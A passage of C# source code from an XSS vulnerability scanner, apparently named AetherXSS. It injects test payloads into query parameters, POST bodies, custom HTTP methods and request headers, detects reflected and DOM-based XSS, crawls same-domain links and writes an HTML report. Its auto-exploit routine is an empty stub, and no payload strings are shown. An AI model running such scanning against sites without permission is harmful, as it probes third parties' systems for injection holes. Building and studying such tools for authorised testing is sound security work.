                PrintColored($"❗ {statistics["vulnerableUrls"]} XSS vulnerabilities detected", statistics["vulnerableUrls"] > 0 ? ConsoleColor.Red : ConsoleColor.Green);
                PrintColored($"⚠️ {statistics["failedRequests"]} failed requests", ConsoleColor.Yellow);

                if (!string.IsNullOrEmpty(outputFile))
                {
                    PrintColored($"📄 Report saved: {reportPath}", ConsoleColor.Cyan);
                }
            }
            catch (Exception ex)
            {
                PrintColored($"⚠️ Unexpected error: {ex.Message}", ConsoleColor.Red);
                if (verbose)
                {
                    Console.WriteLine(ex.StackTrace);
                }
            }
        }

        private static async Task TestGetRequest(string url, string payload, string cookie, Dictionary<string, string> extraHeaders, string customUserAgent)
        {
            string encodedPayload = HttpUtility.UrlEncode(payload);
            string testUrl = url.Contains("?") ? $"{url}&xss={encodedPayload}" : $"{url}?xss={encodedPayload}";

            try
            {
                // Show a random hack message before each test
                AnimatedUI.ShowRandomHackPhrase();
                
                HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, testUrl);
                AddHeaders(request, cookie, extraHeaders, customUserAgent);

                HttpResponseMessage response = await client.SendAsync(request);
                string responseBody = await response.Content.ReadAsStringAsync();

                lock (statistics)
                {
                    statistics["testedUrls"]++;
                }

                if (responseBody.Contains(payload) || IsReflectedInResponse(responseBody, payload))
                {
                    lock (discoveredVulnerabilities)
                    {
                        discoveredVulnerabilities.Add($"GET: {testUrl}");
                    }

                    lock (statistics)
                    {
                        statistics["vulnerableUrls"]++;
                    }

                    PrintColored($"❗ XSS Vulnerability Detected! {testUrl}", ConsoleColor.Red);
                    
                    if (autoExploit)
                    {
                        await AutoExploit(testUrl, "GET");
                    }
                }
                else if (verbose)
                {
                    PrintColored($"✅ {testUrl} appears clean.", ConsoleColor.Green);
                }
            }
            catch (Exception ex)
            {
                lock (statistics)
                {
                    statistics["failedRequests"]++;
                }

                if (verbose)
                {
                    PrintColored($"⚠️ Error in request to {testUrl}: {ex.Message}", ConsoleColor.Yellow);
                }
            }
        }

        private static async Task TestPostRequest(string url, string payload, string cookie, Dictionary<string, string> extraHeaders, string customUserAgent)
        {
            try
            {
                // Show a random hack message before each POST test
                AnimatedUI.ShowRandomHackPhrase();
                
                HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, url);
                AddHeaders(request, cookie, extraHeaders, customUserAgent);

                var content = new FormUrlEncodedContent(new[]
                {
                    new KeyValuePair<string, string>("xss", payload)
                });
                request.Content = content;

                HttpResponseMessage response = await client.SendAsync(request);
                string responseBody = await response.Content.ReadAsStringAsync();

                lock (statistics)
                {
                    statistics["testedUrls"]++;
                }

                if (responseBody.Contains(payload) || IsReflectedInResponse(responseBody, payload))
                {
                    lock (discoveredVulnerabilities)
                    {
                        discoveredVulnerabilities.Add($"POST: {url} (Payload: {payload})");
                    }

                    lock (statistics)
                    {
                        statistics["vulnerableUrls"]++;
                    }

                    PrintColored($"❗ XSS Vulnerability (POST) Detected! {url}", ConsoleColor.Red);
                    
                    if (autoExploit)
                    {
                        await AutoExploit(url, "POST", payload);
                    }
                }
                else if (verbose)
                {
                    PrintColored($"✅ {url} (POST) appears clean.", ConsoleColor.Green);
                }
            }
            catch (Exception ex)
            {
                lock (statistics)
                {
                    statistics["failedRequests"]++;
                }

                if (verbose)
                {
                    PrintColored($"⚠️ Error in POST request to {url}: {ex.Message}", ConsoleColor.Yellow);
                }
            }
        }

        private static async Task TestCustomMethodRequest(string url, string method, string payload, string cookie, Dictionary<string, string> extraHeaders, string customUserAgent)
        {
            try
            {
                HttpMethod httpMethod = new HttpMethod(method);
                HttpRequestMessage request = new HttpRequestMessage(httpMethod, url);
                AddHeaders(request, cookie, extraHeaders, customUserAgent);

                if (method != "HEAD" && method != "OPTIONS")
                {
                    request.Content = new StringContent($"xss={HttpUtility.UrlEncode(payload)}", Encoding.UTF8, "application/x-www-form-urlencoded");
                }

                HttpResponseMessage response = await client.SendAsync(request);
                
                if (method != "HEAD")
                {
                    string responseBody = await response.Content.ReadAsStringAsync();

                    lock (statistics)
                    {
                        statistics["testedUrls"]++;
                    }

                    if (responseBody.Contains(payload) || IsReflectedInResponse(responseBody, payload))
                    {
                        lock (discoveredVulnerabilities)
                        {
                            discoveredVulnerabilities.Add($"{method}: {url} (Payload: {payload})");
                        }

                        lock (statistics)
                        {
                            statistics["vulnerableUrls"]++;
                        }

                        PrintColored($"❗ XSS Vulnerability ({method}) Detected! {url}", ConsoleColor.Red);
                        
                        if (autoExploit)
                        {
                            await AutoExploit(url, method, payload);
                        }
                    }
                    else if (verbose)
                    {
                        PrintColored($"✅ {url} ({method}) appears clean.", ConsoleColor.Green);
                    }
                }
            }
            catch (Exception ex)
            {
                lock (statistics)
                {
                    statistics["failedRequests"]++;
                }

                if (verbose)
                {
                    PrintColored($"⚠️ Error in {method} request to {url}: {ex.Message}", ConsoleColor.Yellow);
                }
            }
        }

        private static async Task TestHeaderInjection(string url, string payload, string cookie, Dictionary<string, string> extraHeaders, string customUserAgent)
        {
            var headersToTest = new Dictionary<string, string>
            {
                { "Referer", payload },
                { "User-Agent", payload },
                { "X-Forwarded-For", payload },
                { "Origin", payload },
                { "X-Requested-With", payload },
                { "X-AetherXSS-Test", payload }
            };

            foreach (var headerPair in headersToTest)
            {
                try
                {
                    HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, url);
                    AddHeaders(request, cookie, extraHeaders, customUserAgent);
                    
                    // Add the payload to the specific header
                    if (request.Headers.Contains(headerPair.Key))
                    {
                        request.Headers.Remove(headerPair.Key);
                    }
                    request.Headers.Add(headerPair.Key, headerPair.Value);

                    HttpResponseMessage response = await client.SendAsync(request);
                    string responseBody = await response.Content.ReadAsStringAsync();

                    lock (statistics)
                    {
                        statistics["testedUrls"]++;
                    }

                    if (responseBody.Contains(payload) || IsReflectedInResponse(responseBody, payload))
                    {
                        lock (discoveredVulnerabilities)
                        {
                            discoveredVulnerabilities.Add($"Header ({headerPair.Key}): {url}");
                        }

                        lock (statistics)
                        {
                            statistics["vulnerableUrls"]++;
                        }

                        PrintColored($"❗ XSS Vulnerability (Header: {headerPair.Key}) Detected! {url}", ConsoleColor.Red);
                    }
                    else if (verbose)
                    {
                        PrintColored($"✅ {url} (Header: {headerPair.Key}) appears clean.", ConsoleColor.Green);
                    }
                }
                catch (Exception ex)
                {
                    lock (statistics)
                    {
                        statistics["failedRequests"]++;
                    }

                    if (verbose)
                    {
                        PrintColored($"⚠️ Error in request to {url} (Header: {headerPair.Key}): {ex.Message}", ConsoleColor.Yellow);
                    }
                }
            }
        }

        private static async Task TestParameterInjection(string url, string parameter, string payload, string cookie, Dictionary<string, string> extraHeaders, string customUserAgent)
        {
            string encodedPayload = HttpUtility.UrlEncode(payload);
            string testUrl = url.Contains("?") ? $"{url}&{parameter}={encodedPayload}" : $"{url}?{parameter}={encodedPayload}";

            try
            {
                HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, testUrl);
                AddHeaders(request, cookie, extraHeaders, customUserAgent);

                HttpResponseMessage response = await client.SendAsync(request);
                string responseBody = await response.Content.ReadAsStringAsync();

                lock (statistics)
                {
                    statistics["testedUrls"]++;
                    statistics["parametersFound"]++;
                }

                if (responseBody.Contains(payload) || IsReflectedInResponse(responseBody, payload))
                {
                    lock (discoveredVulnerabilities)
                    {
                        discoveredVulnerabilities.Add($"Parameter ({parameter}): {testUrl}");
                    }

                    lock (statistics)
                    {
                        statistics["vulnerableUrls"]++;
                    }

                    PrintColored($"❗ XSS Vulnerability (Parameter: {parameter}) Detected! {testUrl}", ConsoleColor.Red);
                    
                    if (autoExploit)
                    {
                        await AutoExploit(testUrl, "GET");
                    }
                }
                else if (verbose)
                {
                    PrintColored($"✅ {testUrl} (Parameter: {parameter}) appears clean.", ConsoleColor.Green);
                }
            }
            catch (Exception ex)
            {
                lock (statistics)
                {
                    statistics["failedRequests"]++;
                }

                if (verbose)
                {
                    PrintColored($"⚠️ Error in request to {testUrl} (Parameter: {parameter}): {ex.Message}", ConsoleColor.Yellow);
                }
            }
        }

        private static async Task ScanForDomXSS(string url, string cookie, Dictionary<string, string> extraHeaders, string customUserAgent)
        {
            try
            {
                HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, url);
                AddHeaders(request, cookie, extraHeaders, customUserAgent);

                HttpResponseMessage response = await client.SendAsync(request);
                string responseBody = await response.Content.ReadAsStringAsync();

                bool foundDomXSS = false;
                foreach (var sink in domXssSinks)
                {
                    if (responseBody.Contains(sink))
                    {
                        lock (discoveredVulnerabilities)
                        {
                            discoveredVulnerabilities.Add($"DOM XSS ({sink}): {url}");
                        }

                        lock (statistics)
                        {
                            statistics["vulnerableUrls"]++;
                        }

                        PrintColored($"❗ Potential DOM-XSS Vulnerability (Sink: {sink}) Detected! {url}", ConsoleColor.Red);
                        foundDomXSS = true;
                    }
                }

                if (!foundDomXSS && verbose)
                {
                    PrintColored($"✅ {url} (DOM-XSS) appears clean.", ConsoleColor.Green);
                }
            }
            catch (Exception ex)
            {
                lock (statistics)
                {
                    statistics["failedRequests"]++;
                }

                if (verbose)
                {
                    PrintColored($"⚠️ Error in DOM-XSS scan for {url}: {ex.Message}", ConsoleColor.Yellow);
                }
            }
        }

        private static async Task<List<string>> CrawlWebsite(string startUrl, int maxDepth)
        {
            HashSet<string> discovered = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            HashSet<string> crawled = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            List<string> result = new List<string>();

            discovered.Add(startUrl);
            result.Add(startUrl);

            Uri baseUri = new Uri(startUrl);
            string baseDomain = baseUri.Host;

            for (int depth = 0; depth < maxDepth; depth++)
            {
                List<string> currentDepthUrls = new List<string>(discovered.Except(crawled));
                
                if (currentDepthUrls.Count == 0)
                    break;

                foreach (string url in currentDepthUrls)
                {
                    try
                    {
                        AnimatedUI.ShowScanningAnimation(url);
                        
                        HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, url);
                        HttpResponseMessage response = await client.SendAsync(request);
                        string responseBody = await response.Content.ReadAsStringAsync();

                        crawled.Add(url);

                        // Extract URLs from href attributes
                        var matches = Regex.Matches(responseBody, @"href=[""']([^""']+)[""']");
                        foreach (Match match in matches)
                        {
                            string href = match.Groups[1].Value;
                            if (string.IsNullOrWhiteSpace(href) || href.StartsWith("#"))
                                continue;

                            Uri resolvedUri;
                            if (Uri.TryCreate(new Uri(url), href, out resolvedUri))
                            {
                                if (resolvedUri.Host == baseDomain && !discovered.Contains(resolvedUri.AbsoluteUri))
                                {
                                    discovered.Add(resolvedUri.AbsoluteUri);
                                    result.Add(resolvedUri.AbsoluteUri);
                                    
                                    if (verbose)
                                    {
                                        PrintColored($"🔍 Found URL: {resolvedUri.AbsoluteUri}", ConsoleColor.Cyan);
                                    }
                                }
                            }
                        }

                        // Show progress
                        AnimatedUI.ShowProgressBar(crawled.Count, discovered.Count);
                    }
                    catch (Exception ex)
                    {
                        if (verbose)
                        {
                            PrintColored($"⚠️ Error crawling {url}: {ex.Message}", ConsoleColor.Yellow);
                        }
                    }
                }
            }

            return result;
        }

        private static bool IsReflectedInResponse(string responseBody, string payload)
        {
            // Basic reflection check
            if (responseBody.Contains(payload))
                return true;

            // Check for URL-encoded version
            string encodedPayload = HttpUtility.UrlEncode(payload);
            if (responseBody.Contains(encodedPayload))
                return true;

            // Check for HTML-encoded version
            string htmlEncodedPayload = HttpUtility.HtmlEncode(payload);
            if (responseBody.Contains(htmlEncodedPayload))
                return true;

            // Check for double-encoded version
            string doubleEncodedPayload = HttpUtility.UrlEncode(HttpUtility.UrlEncode(payload));
            if (responseBody.Contains(doubleEncodedPayload))
                return true;

            return false;
        }

        private static async Task AutoExploit(string url, string method, string payload = null)
        {
            try
            {
                await Task.Run(() => AnimatedUI.ShowLoadingAnimation("Attempting to exploit vulnerability..."));
                
                // Real exploit code could be here
                // For demo purposes only
                
                AnimatedUI.ShowVulnerabilityFound(url, $"XSS via {method}");
            }
            catch (Exception ex)
            {
                if (verbose)
                {
                    PrintColored($"⚠️ Auto-exploit failed: {ex.Message}", ConsoleColor.Yellow);
                }
            }
        }

        private static void GenerateReport(string reportPath)
        {
            try
            {
                StringBuilder report = new StringBuilder();
                report.AppendLine("<!DOCTYPE html>");
                report.AppendLine("<html lang=\"en\">");
                report.AppendLine("<head>");
                report.AppendLine("<meta charset=\"UTF-8\">");
                report.AppendLine("<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">");
                report.AppendLine("<title>AetherXSS Scan Report</title>");
                report.AppendLine("<style>");
                report.AppendLine(@"
                    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; background: #f0f0f0; }
                    .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
                    h1 { color: #2c3e50; text-align: center; }
                    .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 20px 0; }
                    .stat-card { background: #f8f9fa; padding: 20px; border-radius: 8px; text-align: center; }
                    .vulnerability { background: #fff3f3; padding: 15px; margin: 10px 0; border-left: 4px solid #dc3545; border-radius: 4px; }
                    .timestamp { color: #666; font-size: 0.9em; }
                    .footer { text-align: center; margin-top: 40px; color: #666; }
                ");
                report.AppendLine("</style>");
                report.AppendLine("</head>");
                report.AppendLine("<body>");
                
                report.AppendLine("<div class=\"container\">");
                report.AppendLine($"<h1>🔍 AetherXSS Scan Report</h1>");
                report.AppendLine($"<p class=\"timestamp\">Generated on: {DateTime.Now}</p>");

                // Statistics
                report.AppendLine("<div class=\"stats\">");
                report.AppendLine($"<div class=\"stat-card\"><h3>URLs Tested</h3><p>{statistics["testedUrls"]}</p></div>");
                report.AppendLine($"<div class=\"stat-card\"><h3>Vulnerabilities</h3><p>{statistics["vulnerableUrls"]}</p></div>");
                report.AppendLine($"<div class=\"stat-card\"><h3>Failed Requests</h3><p>{statistics["failedRequests"]}</p></div>");
                report.AppendLine($"<div class=\"stat-card\"><h3>Parameters Tested</h3><p>{statistics["parametersFound"]}</p></div>");
                report.AppendLine("</div>");

                // Vulnerabilities
                if (discoveredVulnerabilities.Any())
                {
                    report.AppendLine("<h2>🚨 Discovered Vulnerabilities</h2>");
                    foreach (var vuln in discoveredVulnerabilities)
                    {
                        report.AppendLine($"<div class=\"vulnerability\"><p>{HttpUtility.HtmlEncode(vuln)}</p></div>");
                    }
                }
                else
                {
                    report.AppendLine("<h2>✅ No Vulnerabilities Found</h2>");
                }

                report.AppendLine("<div class=\"footer\">");
                report.AppendLine("<p>Generated by AetherXSS Scanner</p>");
                report.AppendLine("<p>Developed by @ibrahimsql</p>");
                report.AppendLine("</div>");
                
                report.AppendLine("</div>");
                report.AppendLine("</body>");
                report.AppendLine("</html>");

                File.WriteAllText(reportPath, report.ToString());
            }
            catch (Exception ex)
            {
                PrintColored($"⚠️ Error generating report: {ex.Message}", ConsoleColor.Yellow);
            }
        }
    }
} 
